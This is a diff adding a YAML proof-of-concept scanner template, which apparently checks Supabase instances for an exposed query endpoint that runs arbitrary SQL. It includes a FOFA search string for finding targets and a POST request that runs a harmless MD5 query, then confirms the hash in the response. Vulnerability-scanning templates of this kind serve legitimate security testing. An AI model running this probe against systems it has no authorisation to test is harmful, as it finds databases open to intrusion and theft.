@@ -1,0 +1,21 @@
+id: poc-yaml-supabase-query-sqli
+info:
+  name: Supabase平台query接口存在sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: supabase
+  fofa: title="Supabase"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/pg-meta/default/query
+  headers:
+    Content-Type: application/json
+  data: '{"query":"SELECT MD5(''{{.t1}}'');"}
+
+    '
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
